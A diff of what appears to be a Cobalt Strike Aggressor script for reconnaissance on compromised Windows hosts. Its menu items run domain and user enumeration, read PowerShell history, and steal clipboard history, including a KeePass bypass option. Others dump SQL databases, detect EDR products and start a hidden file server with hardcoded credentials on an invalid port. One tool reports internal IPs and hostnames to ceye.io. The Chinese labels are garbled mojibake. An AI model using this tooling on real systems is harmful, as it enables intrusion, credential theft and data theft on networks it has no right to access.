@@ -1,7 +1,7 @@
-menu "ĞÅÏ¢ÊÕ¼¯" {
+menu "ä¿¡æ¯æ”¶é›†" {
 
 	
-	menu "µ¥»ú³£ÓÃÃüÁî" {
+	menu "å•æœºå¸¸ç”¨å‘½ä»¤" {
 	item "systeminfo" {
 			$bid = $1['@'];
 			bshell($bid, "systeminfo");
@@ -14,202 +14,202 @@ menu "ĞÅÏ¢ÊÕ¼¯" {
 			$bid = $1['@'];
 			bshell($bid, "ipconfig /all");
 		}
-		item "²é¿´Â·ÓÉ±í" {
+		item "æŸ¥çœ‹è·¯ç”±è¡¨" {
 			$bid = $1['@'];
 			bshell($bid, "route print");
 		}
-		item "²é¿´arp»º´æ" {
+		item "æŸ¥çœ‹arpç¼“å­˜" {
 			$bid = $1['@'];
 			bshell($bid, "arp -A");
 		}
-		item "²é¿´ÓÃ»§ĞÅÏ¢" {
+		item "æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯" {
 			$bid = $1['@'];
 			bshell($bid, "net user");
 		}
-		item "²é¿´°²×°³ÌĞòºÍ°æ±¾ĞÅÏ¢" {
+		item "æŸ¥çœ‹å®‰è£…ç¨‹åºå’Œç‰ˆæœ¬ä¿¡æ¯" {
 			$bid = $1['@'];
 			bshell($bid, "wmic product get name,version");
 		}
-		item "²é¿´°²×°µÄ²¹¶¡" {
+		item "æŸ¥çœ‹å®‰è£…çš„è¡¥ä¸" {
 			$bid = $1['@'];
 			bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
 		}
-		item "²é¿´ÔËĞĞµÄ½ø³Ì¼°Â·¾¶" {
+		item "æŸ¥çœ‹è¿è¡Œçš„è¿›ç¨‹åŠè·¯å¾„" {
 			$bid = $1['@'];
 			bshell($bid, "wmic process get caption,executablepath,commandline");
 		}
-		item "²é¿´½ø³ÌÏêÏ¸ĞÅÏ¢" {
+		item "æŸ¥çœ‹è¿›ç¨‹è¯¦ç»†ä¿¡æ¯" {
 			$bid = $1['@'];
 			bshell($bid, "wmic process get caption,commandline,processid /value");
 		}
-		item "²é¿´·şÎñ" {
+		item "æŸ¥çœ‹æœåŠ¡" {
 			$bid = $1['@'];
 			bshell($bid, "wmic service list brief");
 		}
-		item "²é¿´·À»ğÇ½ÅäÖÃ" {
+		item "æŸ¥çœ‹é˜²ç«å¢™é…ç½®" {
 			$bid = $1['@'];
 			bshell($bid, "netsh firewall show config");
 		}
-		item "²é¿´¼Æ»®ÈÎÎñ" {
+		item "æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" {
 			$bid = $1['@'];
 			bshell($bid, "schtasks.exe");
 		}
-		item "²é¿´¼Æ»®ÈÎÎñÏêÇé" {
+		item "æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡è¯¦æƒ…" {
 			$bid = $1['@'];
 			bshell($bid, "schtasks /query /fo LIST /v");
 		}
-		item "²é¿´Æô¶¯³ÌĞòĞÅÏ¢" {
+		item "æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯" {
 			$bid = $1['@'];
 			bshell($bid, "wmic startup get command,caption");
 		}
-		item "²é¿´ÔÚÏßÓÃ»§" {
+		item "æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·" {
 			$bid = $1['@'];
 			bshell($bid, "query user || qwinsta");
 		}
-		item "²é¿´¿ª»úÊ±¼ä" {
+		item "æŸ¥çœ‹å¼€æœºæ—¶é—´" {
 			$bid = $1['@'];
 			bshell($bid, "net statistics workstation");
 		}
-		item "²é¿´powershell v5ÀúÊ·ÃüÁî" {
+		item "æŸ¥çœ‹powershell v5å†å²å‘½ä»¤" {
 			$bid = $1['@'];
 			bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
 		}
-		item "²é¿´×î½üÊ¹ÓÃµÄÏîÄ¿" {
+		item "æŸ¥çœ‹æœ€è¿‘ä½¿ç”¨çš„é¡¹ç›®" {
 			$bid = $1['@'];
 			bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
 		}
-		item "²é¿´SMBÖ¸ÏòÂ·¾¶" {
+		item "æŸ¥çœ‹SMBæŒ‡å‘è·¯å¾„" {
 			$bid = $1['@'];
 			bshell($bid, "wmic share get name,path");
 		}
 
 	}
 	separator();
-	menu "Óò»·¾³³£ÓÃÃüÁî"{
-	menu "AdFind(²éÑ¯ÓòÄÚĞÅÏ¢)" {
-			item "ÉÏ´«AdFind" {
+	menu "åŸŸç¯å¢ƒå¸¸ç”¨å‘½ä»¤"{
+	menu "AdFind(æŸ¥è¯¢åŸŸå†…ä¿¡æ¯)" {
+			item "ä¸Šä¼ AdFind" {
 				$bid = $1;
 				bupload($bid, script_resource("/modules/InfoCollection/AdFind.exe"));
 			}
-			item "ÁĞ³öÓò¿ØÖÆÆ÷Ãû³Æ" {
+			item "åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc dclist");
 			}
-			item "²éÑ¯µ±Ç°ÓòÖĞÔÚÏßµÄ¼ÆËã»ú" {
+			item "æŸ¥è¯¢å½“å‰åŸŸä¸­åœ¨çº¿çš„è®¡ç®—æœº" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc computers_active");
 			}
-			item "²éÑ¯µ±Ç°ÓòÖĞÔÚÏßµÄ¼ÆËã»ú(Ö»ÏÔÊ¾Ãû³ÆºÍ²Ù×÷ÏµÍ³)" {
+			item "æŸ¥è¯¢å½“å‰åŸŸä¸­åœ¨çº¿çš„è®¡ç®—æœº(åªæ˜¾ç¤ºåç§°å’Œæ“ä½œç³»ç»Ÿ)" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc computers_active name operatingSystem");
 			}
-			item "²éÑ¯µ±Ç°ÓòÖĞËùÓĞ¼ÆËã»ú" {
+			item "æŸ¥è¯¢å½“å‰åŸŸä¸­æ‰€æœ‰è®¡ç®—æœº" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -f \"objectcategory=computer\"");
 			}
-			item "²éÑ¯µ±Ç°ÓòÖĞËùÓĞ¼ÆËã»ú(Ö»ÏÔÊ¾Ãû³ÆºÍ²Ù×÷ÏµÍ³)" {
+			item "æŸ¥è¯¢å½“å‰åŸŸä¸­æ‰€æœ‰è®¡ç®—æœº(åªæ˜¾ç¤ºåç§°å’Œæ“ä½œç³»ç»Ÿ)" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -f \"objectcategory=computer\" name operatingSystem");
 			}
-			item "²éÑ¯ÓòÄÚËùÓĞÓÃ»§" {
+			item "æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -users name");
 			}
-			item "²éÑ¯ËùÓĞGPO" {
+			item "æŸ¥è¯¢æ‰€æœ‰GPO" {
 				$bid = $1['@'];
 				bshell($bid, "AdFind.exe -sc gpodmp");
 			}
-			item "É¾³ıAdFind" {
+			item "åˆ é™¤AdFind" {
 				$bid = $1['@'];
 				bshell($bid, "del /f /s /q AdFind.exe");
 			}
 
 		}
-				item "²éÑ¯Óò" {
+				item "æŸ¥è¯¢åŸŸ" {
 			$bid = $1['@'];
 			bshell($bid, "net view /domain");
 		}
-		item "²é¿´Óò¹Ü" {
+		item "æŸ¥çœ‹åŸŸç®¡" {
 			$bid = $1['@'];
 			bshell($bid, "net group \"domain admins\" /domain");
 		}
-		item "²é¿´ÓòÓÃ»§ÏêÏ¸ĞÅÏ¢" {
-			prompt_text("ÊäÈëÓòÓÃ»§Ãû", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
+		item "æŸ¥çœ‹åŸŸç”¨æˆ·è¯¦ç»†ä¿¡æ¯" {
+			prompt_text("è¾“å…¥åŸŸç”¨æˆ·å", "", lambda({bshell(@bid, "net user $1 /domain");}, @bid => $bid));
 		}
-		item "²é¿´µ±Ç°µÇÂ¼Óò" {
+		item "æŸ¥çœ‹å½“å‰ç™»å½•åŸŸ" {
 			$bid = $1['@'];
 			bshell($bid, "net config workstation");
 		}
-		item "²é¿´Ê±¼ä·şÎñÆ÷" {
+		item "æŸ¥çœ‹æ—¶é—´æœåŠ¡å™¨" {
 			$bid = $1['@'];
 			bshell($bid, "net time /domain");
 		}
-		item "ÏÔÊ¾µ±Ç°ÓòµÄ¼ÆËã»úÁĞ±í" {
+		item "æ˜¾ç¤ºå½“å‰åŸŸçš„è®¡ç®—æœºåˆ—è¡¨" {
 			$bid = $1['@'];
 			bshell($bid, "net view");
 		}
-		item "²é¿´µÇÂ¼±¾»úµÄÓò¹Ü" {
+		item "æŸ¥çœ‹ç™»å½•æœ¬æœºçš„åŸŸç®¡" {
 			$bid = $1['@'];
 			bshell($bid, "net localgroup administrators /domain");
 		}
-		item "²é¿´ËùÓĞÓòÓÃ»§" {
+		item "æŸ¥çœ‹æ‰€æœ‰åŸŸç”¨æˆ·" {
 			$bid = $1['@'];
 			bshell($bid, "net user /domain");
 		}
-		item "²é¿´ÓòÄÚËùÓĞÓÃ»§×éÁĞ±í" {
+		item "æŸ¥çœ‹åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„åˆ—è¡¨" {
 			$bid = $1['@'];
 			bshell($bid, "net group /domain");
 		}
-		item "²é¿´Ö÷Óò¿ØÖÆÆ÷" {
+		item "æŸ¥çœ‹ä¸»åŸŸæ§åˆ¶å™¨" {
 			$bid = $1['@'];
 			bshell($bid, "netdom query pdc");
 		}
-		item "²é¿´Óò¿ØÁĞ±í" {
+		item "æŸ¥çœ‹åŸŸæ§åˆ—è¡¨" {
 			$bid = $1['@'];
 			bshell($bid, "net group \"Domain Controllers\" /domain");
 		}
-		item "²é¿´Óò¿ØÖ÷»úÃû" {
+		item "æŸ¥çœ‹åŸŸæ§ä¸»æœºå" {
 			$bid = $1['@'];
 			bshell($bid, "Nslookup -type=SRV _ldap._tcp");
 		}
-		item "»ñÈ¡ÓòĞÅÈÎĞÅÏ¢" {
+		item "è·å–åŸŸä¿¡ä»»ä¿¡æ¯" {
 			$bid = $1['@'];
 			bshell($bid, "nltest /domain_trusts");
 		}
-		item "»ñÈ¡ÓòÃÜÂëĞÅÏ¢" {
+		item "è·å–åŸŸå¯†ç ä¿¡æ¯" {
 			$bid = $1['@'];
 			bshell($bid, "net accounts /domain");
 		}
-		item "²é¿´ËùÓĞÓò³ÉÔ±¼ÆËã»úÁĞ±í" {
+		item "æŸ¥çœ‹æ‰€æœ‰åŸŸæˆå‘˜è®¡ç®—æœºåˆ—è¡¨" {
 			$bid = $1['@'];
 			bshell($bid, "net group \"domain computers\" /domain");
 		}
-		item "²é¿´ÓòÄÚËùÓĞ¼ÆËã»ú" {
-			prompt_text("ÊäÈëÖ÷»úÃû", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
+		item "æŸ¥çœ‹åŸŸå†…æ‰€æœ‰è®¡ç®—æœº" {
+			prompt_text("è¾“å…¥ä¸»æœºå", "", lambda({bshell(@bid, "net view /domain:$1");}, @bid => $bid));
 		}
 
 
 	}
 
 
-	item "SharpChassisType(ÅĞ¶ÏÖ÷»úÀàĞÍ)" {
+	item "SharpChassisType(åˆ¤æ–­ä¸»æœºç±»å‹)" {
 		$bid = $1['@'];
 		$dialog = dialog("SharpNetCheck", %(bid => $bid), &SharpChassisType);
-		dialog_description($dialog,"ÓÃÓÚÅĞ¶Ïµ±Ç°»úÆ÷ÀàĞÍ(×ÀÃæ¼ÆËã»ú¡¢±Ê¼Ç±¾µÈÅĞ¶Ï)¡£ÏîÄ¿µØÖ·£ºhttps://github.com/RcoIl/CSharp-Tools/");
-		dbutton_action($dialog, "ÔËĞĞ");
+		dialog_description($dialog,"ç”¨äºåˆ¤æ–­å½“å‰æœºå™¨ç±»å‹(æ¡Œé¢è®¡ç®—æœºã€ç¬”è®°æœ¬ç­‰åˆ¤æ–­)ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/RcoIl/CSharp-Tools/");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpChassisType{
 	    bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpChassisType.exe"), "");
 	}
 
-	item "SharpNetCheck(Ì½²â³öÍø)" {
+	item "SharpNetCheck(æ¢æµ‹å‡ºç½‘)" {
 		$bid = $1['@'];
 		$dialog = dialog("SharpNetCheck", %(host => "ceye.io",,type => "all",bid => $bid), &SharpNetCheck);
-		dialog_description($dialog,"ÔÚÄÚÍøÉøÍ¸¹ı³ÌÖĞ£¬¶Ô¿ÉÒÔ³öÍøµÄ»úÆ÷ÊÇÊ®·Ö¿ÊÍûµÄ¡£ÔÚÊÕ¼¯´óÁ¿Èõ¿ÚÁîµÄÇé¿öÏÂ£¬Ò»¸öÒ»¸öÈ¥²âÊÔÄÜ²»ÄÜ³öÍøÌ«Âé·³ÁË¡£ËùÒÔ¾ÍÓĞÁËÕâ¸ö¹¤¾ß£¬¿ÉÅäºÏÈçwmiexec¡¢psexecµÈºáÏò¹¤¾ß½øĞĞÅúÁ¿¼ì²â£¬¸Ã¹¤¾ß¿ÉÒÔÔÚdnslogÖĞ»ØÏÔÄÚÍøipµØÖ·ºÍ¼ÆËã»úÃû£¬¿ÉÊµÏÖÄÚÍøÖĞµÄ¿ìËÙ¶¨Î»¿É³öÍø»úÆ÷¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpNetCheck");
+		dialog_description($dialog,"åœ¨å†…ç½‘æ¸—é€è¿‡ç¨‹ä¸­ï¼Œå¯¹å¯ä»¥å‡ºç½‘çš„æœºå™¨æ˜¯ååˆ†æ¸´æœ›çš„ã€‚åœ¨æ”¶é›†å¤§é‡å¼±å£ä»¤çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ªä¸€ä¸ªå»æµ‹è¯•èƒ½ä¸èƒ½å‡ºç½‘å¤ªéº»çƒ¦äº†ã€‚æ‰€ä»¥å°±æœ‰äº†è¿™ä¸ªå·¥å…·ï¼Œå¯é…åˆå¦‚wmiexecã€psexecç­‰æ¨ªå‘å·¥å…·è¿›è¡Œæ‰¹é‡æ£€æµ‹ï¼Œè¯¥å·¥å…·å¯ä»¥åœ¨dnslogä¸­å›æ˜¾å†…ç½‘ipåœ°å€å’Œè®¡ç®—æœºåï¼Œå¯å®ç°å†…ç½‘ä¸­çš„å¿«é€Ÿå®šä½å¯å‡ºç½‘æœºå™¨ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpNetCheck");
 		drow_combobox($dialog, "type", "-dns/-http/all", @("-dns", "-http","all"));
 		drow_text($dialog, "host", "host/ip:  ");
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpNetCheck {
@@ -218,39 +218,39 @@ menu "ĞÅÏ¢ÊÕ¼¯" {
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpNetCheck.exe"), $arg);
 	}
 
-	item "SharpEventLog(»ñÈ¡ÏµÍ³µÇÂ¼ÈÕÖ¾)" {
+	item "SharpEventLog(è·å–ç³»ç»Ÿç™»å½•æ—¥å¿—)" {
 		$bid = $1;
 		$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
-		dialog_description($dialog, "¶ÁÈ¡µÇÂ¼¹ı±¾»úµÄµÇÂ¼Ê§°Ü»òµÇÂ¼³É¹¦£¨4624£¬4625£©µÄËùÓĞ¼ÆËã»úĞÅÏ¢£¬ÔÚÄÚÍøÉøÍ¸ÖĞ¿ìËÙ¶¨Î»ÔËÎ¬¹ÜÀíÈËÔ±¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpEventLog");
+		dialog_description($dialog, "è¯»å–ç™»å½•è¿‡æœ¬æœºçš„ç™»å½•å¤±è´¥æˆ–ç™»å½•æˆåŠŸï¼ˆ4624ï¼Œ4625ï¼‰çš„æ‰€æœ‰è®¡ç®—æœºä¿¡æ¯ï¼Œåœ¨å†…ç½‘æ¸—é€ä¸­å¿«é€Ÿå®šä½è¿ç»´ç®¡ç†äººå‘˜ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpEventLog");
 		drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpEventLog {
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpEventLog.exe"), $3['EventLogType']);
 	}
 
-	item "SharpCheckInfo(»ñÈ¡¶àÏîÖ÷»úĞÅÏ¢)" {
+	item "SharpCheckInfo(è·å–å¤šé¡¹ä¸»æœºä¿¡æ¯)" {
 		$bid = $1;
 		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
-		dialog_description($dialog, "ÊÕ¼¯Ä¿±êÖ÷»úĞÅÏ¢£¬°üÀ¨×î½ü´ò¿ªÎÄ¼ş£¬ÏµÍ³»·¾³±äÁ¿ºÍ»ØÊÕÕ¾ÎÄ¼şµÈµÈ¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpCheckInfo");
+		dialog_description($dialog, "æ”¶é›†ç›®æ ‡ä¸»æœºä¿¡æ¯ï¼ŒåŒ…æ‹¬æœ€è¿‘æ‰“å¼€æ–‡ä»¶ï¼Œç³»ç»Ÿç¯å¢ƒå˜é‡å’Œå›æ”¶ç«™æ–‡ä»¶ç­‰ç­‰ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpCheckInfo");
 		drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpCheckInfo {
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpCheckInfo.exe"), $3['Type']);
 	}
 
-	item "SharpSQLDump(¿ìËÙÁĞ³öÊı¾İ¿âÊı¾İ)" {
+	item "SharpSQLDump(å¿«é€Ÿåˆ—å‡ºæ•°æ®åº“æ•°æ®)" {
 		$bid = $1['@'];
 		$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
-		dialog_description($dialog, "ÄÚÍøÉøÍ¸ÖĞ¿ìËÙ»ñÈ¡Êı¾İ¿âËùÓĞ¿âÃû£¬±íÃû£¬ÁĞÃû¡£¾ßÌåÅĞ¶ÏºóÔÙÈ¥·­Êı¾İ£¬½ÚÊ¡Ê±¼ä¡£ÊÊÓÃÓÚmysql£¬mssql¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpSQLDump");
+		dialog_description($dialog, "å†…ç½‘æ¸—é€ä¸­å¿«é€Ÿè·å–æ•°æ®åº“æ‰€æœ‰åº“åï¼Œè¡¨åï¼Œåˆ—åã€‚å…·ä½“åˆ¤æ–­åå†å»ç¿»æ•°æ®ï¼ŒèŠ‚çœæ—¶é—´ã€‚é€‚ç”¨äºmysqlï¼Œmssqlã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpSQLDump");
 		drow_text($dialog, "host", "host:  ");
 		drow_text($dialog, "username", "username:  ");
 		drow_text($dialog, "password", "password:  ");
 		drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpSQLDump {
@@ -258,43 +258,43 @@ menu "ĞÅÏ¢ÊÕ¼¯" {
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpSQLDump.exe"), $arg);
 	}
 
-	item "SharpClipHistory(»ñÈ¡win10¼ôÇĞ°å)" {
+	item "SharpClipHistory(è·å–win10å‰ªåˆ‡æ¿)" {
 		$bid = $1;
 		$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpClipHistory);
-		dialog_description($dialog, "¿ÉÓÃÓÚ´Ó1809 Build°æ±¾¿ªÊ¼¶ÁÈ¡Windows 10ÖĞÓÃ»§¼ôÌù°åÀúÊ·¼ÇÂ¼µÄÄÚÈİ¡£¿Õ°×ÀàĞÍÑ¡Ïî±íÊ¾¶ÁÈ¡¡£ÏîÄ¿µØÖ·£ºhttps://github.com/FSecureLABS/SharpClipHistory");
+		dialog_description($dialog, "å¯ç”¨äºä»1809 Buildç‰ˆæœ¬å¼€å§‹è¯»å–Windows 10ä¸­ç”¨æˆ·å‰ªè´´æ¿å†å²è®°å½•çš„å†…å®¹ã€‚ç©ºç™½ç±»å‹é€‰é¡¹è¡¨ç¤ºè¯»å–ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/FSecureLABS/SharpClipHistory");
 		drow_combobox($dialog, "Type", "Type:", @("--help","","--checkOnly","--enableHistory","--saveImages","--keepassBypass"));
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpClipHistory {
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpClipHistory.exe"), $3['Type']);
 	}
 
-	item "SharpAVKB(É±ÈíºÍ²¹¶¡¶Ô±È)" {
+	item "SharpAVKB(æ€è½¯å’Œè¡¥ä¸å¯¹æ¯”)" {
 		$bid = $1;
 		$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
-		dialog_description($dialog, "WindowsÉ±Èí¶Ô±ÈºÍ²¹¶¡ºÅ¶Ô±È¡£ÏîÄ¿µØÖ·£ºhttps://github.com/uknowsec/SharpAVKB");
+		dialog_description($dialog, "Windowsæ€è½¯å¯¹æ¯”å’Œè¡¥ä¸å·å¯¹æ¯”ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/uknowsec/SharpAVKB");
 		drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpAVKB {
 		bexecute_assembly($bid, script_resource("/modules/InfoCollection/SharpAVKB.exe"), $3['type']);
 	}
 
-	item "SharpEDRChecker(»ñÈ¡EDRĞÅÏ¢)" {
+	item "SharpEDRChecker(è·å–EDRä¿¡æ¯)" {
 		$bid = $1['@'];
-		btask($bid, "¼ì²éÕıÔÚÔËĞĞµÄ½ø³Ì£¬½ø³ÌÔªÊı¾İ£¬¼ÓÔØµ½µ±Ç°½ø³ÌÖĞµÄDllÒÔ¼°Ã¿¸öDLLÔªÊı¾İ£¬Í¨ÓÃ°²×°Ä¿Â¼£¬ÒÑ°²×°µÄ·şÎñºÍÃ¿¸ö·şÎñ¶ş½øÖÆÔªÊı¾İ£¬ÒÑ°²×°µÄÇı¶¯³ÌĞòºÍÃ¿¸öÇı¶¯³ÌĞòÔªÊı¾İ£¬ËùÓĞÕâĞ©¶¼´æÔÚÒÑÖªµÄ·ÀÓùĞÔ²úÆ·£¬ÀıÈçAV£¬EDRºÍÈÕÖ¾¼ÇÂ¼¹¤¾ß¡£»¹¿ÉÒÔÍ¨¹ıÆäÔªÊı¾İ¼ì²éÀ´²¶»ñÒş²ØµÄEDR¡£ÏîÄ¿µØÖ·£ºhttps://github.com/PwnDexter/SharpEDRChecker", "");
+		btask($bid, "æ£€æŸ¥æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œè¿›ç¨‹å…ƒæ•°æ®ï¼ŒåŠ è½½åˆ°å½“å‰è¿›ç¨‹ä¸­çš„Dllä»¥åŠæ¯ä¸ªDLLå…ƒæ•°æ®ï¼Œé€šç”¨å®‰è£…ç›®å½•ï¼Œå·²å®‰è£…çš„æœåŠ¡å’Œæ¯ä¸ªæœåŠ¡äºŒè¿›åˆ¶å…ƒæ•°æ®ï¼Œå·²å®‰è£…çš„é©±åŠ¨ç¨‹åºå’Œæ¯ä¸ªé©±åŠ¨ç¨‹åºå…ƒæ•°æ®ï¼Œæ‰€æœ‰è¿™äº›éƒ½å­˜åœ¨å·²çŸ¥çš„é˜²å¾¡æ€§äº§å“ï¼Œä¾‹å¦‚AVï¼ŒEDRå’Œæ—¥å¿—è®°å½•å·¥å…·ã€‚è¿˜å¯ä»¥é€šè¿‡å…¶å…ƒæ•°æ®æ£€æŸ¥æ¥æ•è·éšè—çš„EDRã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/PwnDexter/SharpEDRChecker", "");
 		bexecute_assembly($1, script_resource("/modules/InfoCollection/SharpEDRChecker.exe"), "");
 	}
 
-	item "SharpDir(ÎÄ¼şËÑË÷)" {
+	item "SharpDir(æ–‡ä»¶æœç´¢)" {
 		$bid = $1['@'];
-		$dialog = dialog("ÎÄ¼şËÑË÷", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
-		dialog_description($dialog, "ÎÄ¼şËÑË÷£¬ÈıÖÖËÑË÷·½Ê½£¬Ö¸¶¨ÎÄ¼şÃû¡¢ÖÆ¶¨ÎÄ¼şÃûËÑË÷ºó×º¡¢ËÑË÷Ö¸¶¨ºó×ºÎÄ¼ş¡£ÏîÄ¿µØÖ·£ºhttps://github.com/jnqpblc/SharpDir");
+		$dialog = dialog("æ–‡ä»¶æœç´¢", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
+		dialog_description($dialog, "æ–‡ä»¶æœç´¢ï¼Œä¸‰ç§æœç´¢æ–¹å¼ï¼ŒæŒ‡å®šæ–‡ä»¶åã€åˆ¶å®šæ–‡ä»¶åæœç´¢åç¼€ã€æœç´¢æŒ‡å®šåç¼€æ–‡ä»¶ã€‚é¡¹ç›®åœ°å€ï¼šhttps://github.com/jnqpblc/SharpDir");
 		drow_text($dialog, "path", "path:  ");
 		drow_text($dialog, "file", "file:  ");
-		dbutton_action($dialog, "ÔËĞĞ");
+		dbutton_action($dialog, "è¿è¡Œ");
 		dialog_show($dialog);
 	}
 	sub SharpDir {
@@ -304,13 +304,13 @@ menu "ĞÅÏ¢ÊÕ¼¯" {
 	separator();
 
 
-menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
-		item "ÉÏ´«Everything" {
+menu "Everything(å»ºç«‹httpæœåŠ¡æ–‡ä»¶æœç´¢)" {
+		item "ä¸Šä¼ Everything" {
 			$bid = $1;
-			$dialog = dialog("ÉÏ´« Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
-			dialog_description($dialog, "ÔËĞĞÎŞÈÎºÎµ¯´°£¬Èí¼şµØÖ·£ºhttps://www.voidtools.com/zh-cn/");
-			drow_text($dialog, "UploadPath",  "ÉÏ´«Â·¾¶: ");
-			dbutton_action($dialog, "ÉÏ´«");
+			$dialog = dialog("ä¸Šä¼  Everything", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &evething);
+			dialog_description($dialog, "è¿è¡Œæ— ä»»ä½•å¼¹çª—ï¼Œè½¯ä»¶åœ°å€ï¼šhttps://www.voidtools.com/zh-cn/");
+			drow_text($dialog, "UploadPath",  "ä¸Šä¼ è·¯å¾„: ");
+			dbutton_action($dialog, "ä¸Šä¼ ");
 			dialog_show($dialog);
 		}
 		sub evething {
@@ -323,23 +323,23 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
 			}
 		}
 
-		item "ÔËĞĞEverything"{
+		item "è¿è¡ŒEverything"{
 			$bid = $1['@'];
-			$Dialog = dialog("ÔËĞĞEvething",%(bid => $bid),&Evething_run);
-			dialog_description($Dialog, "ÔËĞĞÎŞÈÎºÎµ¯´°¼°ÍĞÅÌÏÔÊ¾£¬×Ô¶¯ÆôÓÃhttp·şÎñ¡£¶Ë¿Ú£º65536£¬ÓÃ»§£ºadmin£¬ÃÜÂë£ºadmin@123");
-			dbutton_action($Dialog, "ÔËĞĞ");
+			$Dialog = dialog("è¿è¡ŒEvething",%(bid => $bid),&Evething_run);
+			dialog_description($Dialog, "è¿è¡Œæ— ä»»ä½•å¼¹çª—åŠæ‰˜ç›˜æ˜¾ç¤ºï¼Œè‡ªåŠ¨å¯ç”¨httpæœåŠ¡ã€‚ç«¯å£ï¼š65536ï¼Œç”¨æˆ·ï¼šadminï¼Œå¯†ç ï¼šadmin@123");
+			dbutton_action($Dialog, "è¿è¡Œ");
 			dialog_show($Dialog);
 		}
 		sub Evething_run{
 			bshell($bid, "Everything.exe");
 		}
-		item "Í£Ö¹Everything"{
+		item "åœæ­¢Everything"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im Everything.exe");
 			}
 		}
-		item "É¾³ıEverything"{
+		item "åˆ é™¤Everything"{
 			local('$bid');
 			foreach $bid ($1){
 				bshell($1, "taskkill -f /im Everything.exe & del /f /s /q Everything.exe & del /f /s /q Everything.ini");
@@ -347,14 +347,14 @@ menu "Everything(½¨Á¢http·şÎñÎÄ¼şËÑË÷)" {
 		}
 	}
 
-	menu "¶¨Î»Óò¹Ü" {
+	menu "å®šä½åŸŸç®¡" {
   menu "PsLoggedon" {
-    item "ÉÏ´«PsLoggedon" {
+    item "ä¸Šä¼ PsLoggedon" {
       $bid = $1;
